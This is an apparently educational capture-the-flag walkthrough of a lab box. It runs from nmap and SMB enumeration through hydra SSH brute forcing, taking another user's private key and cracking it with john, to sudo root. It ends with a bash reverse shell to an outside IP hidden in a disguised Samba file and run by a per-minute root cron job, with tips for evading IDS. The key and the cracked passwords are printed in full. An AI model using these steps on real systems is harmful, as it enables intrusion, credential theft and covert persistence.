0 - Reconnaissance

nmap -sC -sV -oA nmap/BasicPentesting-Fast 10.10.137.245

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                        
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)                           
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods:  
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-open-proxy: Proxy might be redirecting requests                                                                
|_http-title: Apache Tomcat/9.0.7                                                                                     
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-01-09T22:51:31
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-01-09T17:51:31-05:00

Ports of actual interest: 139+445, 8009,8080,80

Port Service Mappings (based on RFC):

139+445: SMB
8009: None
8080: None
80: HTTP

Port Service Mappings (based on banners):

8009: HTTP
8080: HTTP
80: HTTP
139+445: SMB

Theory: You could brute force SSH but we have no passwords and no users as of yet so further enumeration is required.

Starting off I'm going to curl for the initial pages on each of the web servers

80: Tells us the system is undergoing maintenance.

      <html>                                               
                                                                                                                      
      <h1>Undergoing maintenance</h1>                                                                                       
                                                                                                                      
      <h4>Please check back later</h4>                                                                                      
                                                                                                                      
      <!-- Check our dev note section if you need to know what to work on. -->                                              
                                                                                                                      
                                                                                                                      
      </html>
      
 8080: Generic Apache web page
 8009: Gives curl an empty reply
 
 Lets try and visit these pages in an actual browser, 8009 and 80 are the most interesting at this point in time.
 Reasoning: Web sites (especially custom ones) like to filter and deliver content depending on the browser header.
 Note: We could change the browser header in curl to match but I don't have those handy at the moment.
 
 8009: Gives empty reply to browser
 8080: Default Apache page like usual.
 
 At this point the only 2 functional ports that I can see are SSH (assumed), 80, and 8080
 
 Time to kick off some subdirectory enumeration.
 
 I typically start off using the raft-medium-words.txt file in the SecLists github repo and gobuster is my tool of choice for "vanilla" directory enumeration.
 
 Usually I'm doing multiple passes of the same wordlist. One with the generic wordlist and another with extensions.
 
 1. gobuster dir -w ~/Path/To/raft-medium-words.txt -u $URL
 2. gobuster dir -w ~/Path/To/raft-medium-words.txt -u $URL -x $Extension (depends on web content format (e.g php, html, etc.)
 3. gobuster dir -w ~/Path/To/dirb/common.txt -u $URL
 4. gobuster dir -w ~/Path/To/directory-list-2.3-medium.txt -u $URL
 5. gobuster dir -w ~/Path/To/directory-list-2.3-medium.txt -u $URL -x $Extension
 
 Other wordlists that I could use:
 directory-list-2.3-large.txt
 raft-large-words.txt
 
 Gobuster results:
 Gobuster v3.1.0                                                                                                                                                                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                                                                
===============================================================                                                                                                                                                                              
[+] Url:                     http://10.10.137.245:80/                                                                                                                                                                                        
[+] Method:                  GET                                                                                                                                                                                                             
[+] Threads:                 10                                                                                                                                                                                                              
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt                                                                                                                                       
[+] Negative Status codes:   404                                                                                                                                                                                                             
[+] User Agent:              gobuster/3.1.0                                                                                                                                                                                                  
[+] Timeout:                 10s
===============================================================
2022/01/09 18:03:20 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 293]
/.htm                 (Status: 403) [Size: 292]
/.                    (Status: 200) [Size: 158]
/.htaccess            (Status: 403) [Size: 297]
/development          (Status: 301) [Size: 320] [--> http://10.10.137.245/development/]
/.htc                 (Status: 403) [Size: 292]                                         
/.html_var_DE         (Status: 403) [Size: 300]                                         
/server-status        (Status: 403) [Size: 301]                                         
/.htpasswd            (Status: 403) [Size: 297]                                         
/.html.               (Status: 403) [Size: 294]                                         
/.html.html           (Status: 403) [Size: 298]                                         
/.htpasswds           (Status: 403) [Size: 298]                                         
/.htm.                (Status: 403) [Size: 293]                                         
/.htmll               (Status: 403) [Size: 294]                                         
/.html.old            (Status: 403) [Size: 297]         

We see that we have a development folder, lets go take a look....

we have 2 files:

dev.txt
j.txt

dev.txt contents:

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J


j.txt contents:

For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

Takeaways: SMB is the next step to this box, we now have first initials which may not seem like much but we COULD use crunch to generate a list of usernames to begin bruteforcing SSH but we also know that J has a weak password and that SMB has been configured.

Poking at SMB:

See if we have anonymous login to SMB:

nmap:

nmap -sC -p 139,445 10.10.137.245

You can also just try anonymous login using smbclient (you may have to edit the /etc/smb.conf file)

smbclient:

Null Attack:

smbclient -N -L ////10.10.137.245//

Anonymous login:

smbclient -U anonymous -L ////10.10.137.245//

nmap output:

Host script results:                                                                                                                                                                                                                         
| smb2-security-mode:                                                                                                                                                                                                                        
|   3.1.1:                                                                                                                                                                                                                                   
|_    Message signing enabled but not required                                                                                                                                                                                               
| smb-security-mode:                                                                                                                                                                                                                         
|   account_used: guest                                                                                                                                                                                                                      
|   authentication_level: user                                                                                                                                                                                                               
|   challenge_response: supported                                                                                                                                                                                                            
|_  message_signing: disabled (dangerous, but default)                                                                                                                                                                                       
| p2p-conficker:                                                                                                                                                                                                                             
|   Checking for Conficker.C or higher...
|   Check 1 (port 38610/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41142/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38487/udp): CLEAN (Failed to receive data)
|   Check 4 (port 46919/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time: 
|   date: 2022-01-09T23:13:13
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-01-09T18:13:13-05:00

smbclient output:

smbclient -N -L ////10.10.137.245            

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

smbclient -U anonymous \\\\10.10.137.245\\Anonymous                                                                                                                                                                                  1 ⨯
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11084008 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)

we see a file named "staff.txt" let's take a look at that...

staff.txt Output:

Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

We get 2 usernames!

Jan and Kay

Key takeaways:

2 New Usernames:
Jan
Kay

Findings on a pentest report: unsigned SMB, anonymous access to SMB share, directory indexing on web servers.

So far these are all informational disclosure findings so how do we turn this to be malicious?

Lets use this information to login.

We don't have any passwords as of yet but I'm willing to bet we can compromise one of their passwords using crackmapexec or hydra (there's a million tools for this)

crackmapexec:

crackmapexec ssh -u $username|$userfile -p $password|$passwordfile --port 22 10.10.137.245 (--port is not needed but mine was bugging out so I had to use it for it to operate)

hydra:

hydra -L users.txt -P /usr/share/wordlists/SecLists/Passwords/darkc0de.txt ssh://10.10.137.245 -I -t 64
hydra -L kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.137.245 -I -t 64

(Since there's 14344392 passwords in rockyou.txt and it would take forever I highly recommend using shorter wordlists in the SecLists github repo exception is for collected password hashes)

Hydra Output:

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-09 18:55:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://10.10.137.245:22/
[22][ssh] host: 10.10.137.245   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-09 18:55:27

Alternate password files that I use for service cracking:

darkc0de.txt
darkweb2017-top10000.txt
2020-200_most_used_passwords.txt
citrix.txt
rockyou.txt

SideNote: It is always wise to investigate password lockout policies before bruteforcing anything, especially services.

Status: Now on the box with jan's credentials

Privilege escalation Enumeration.

uname -r (kernel version)

4.4.0-119-generic

echo $PATH

Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

cat /etc/passwd | grep "sh$"

Output: 

root:x:0:0:root:/root:/bin/bash
kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
jan:x:1001:1001::/home/jan:/bin/bash

cat /etc/crontab

output:

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

sudo -l

output:

[sudo] password for jan: 
Sorry, user jan may not run sudo on basic2.

we don't have an cron jobs or any weird directories in our $PATH, what are our options? We still have the Kernel but due to possible (probable) availability issues after kernel exploits we avoid those at all costs...

What other options do we have?

We have another user on this box that we can look at.

ssh is open on this box so we know that most (all) users are going to have private keys attached to their user.

cd /home/kay/.ssh
cat id_rsa

Output:

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----

Cool! We have another users private key. Now what do we do with it?

There's a couple ways to go about this, 1. is to attempt to crack the private key, another is to just use the private key.....

Uh OH! When attempting to use the private key we have to enter the passphrase for the key!

How do we crack rsa keys? We use john to "rip it up".

python ssh2john.py id_rsa > id_rsa.hash

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

Output:

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)
1g 0:00:00:01 DONE (2022-01-09 19:35) 0.8064g/s 11565Kp/s 11565Kc/s 11565KC/s  0125457423 ..*7¡Vamos!
Session completed

Now we can login to Kay's account over SSH using the identity file we took.

ssh -i id_rsa kay@10.10.137.245

After logging in we see a file called "pass.bak"

file pass.bak
pass.bak: ASCII text

cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

Lets see if this is a root password.....

su root

Nope!

We're back to privilege escalation enumeration.

echo $PATH

/home/kay/bin:/home/kay/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

sudo -l

[sudo] password for kay: 
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
    
kay can run anything as sudo...

We are essentially root right now, but how can we become root?

sudo /bin/bash is the obvious answer.

Persistence?

I like to do this in the cron jobs personally but there's a million other ways to generate persistence. So we'll do a simple one.

Hopping over to Pentest Reverse Shell cheat sheet: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

We have a reverse shell in bash there.

If we make a file somewhere on the filesystem we can generate a cron task that runs every minute to call out a reverse shell to our machine.

Another option is to poison a service and insert a reverse shell into a binary (like apache). There's a million ways. But keeping it simple is the way I'm going this time.

sudo touch /usr/share/samba/setup/namedd

echo "sudo bash -i >& /dev/tcp/10.6.48.205/139 0>&1" >> /usr/share/samba/setup/named

sudo chmod +x named

vi /etc/crontab

* * * * root "bash /usr/share/samba/setup/named"

This crontab makes it run every minute but can be customized to any time period you would like.

You can also obfuscate this further by putting more bash code in the cron job and/or poisoning more than just the crontab. I would recommend using destination ports the server is already hosting to help avoid heuristic IDS/IPS.

This is the Box! Hope you enjoyed!
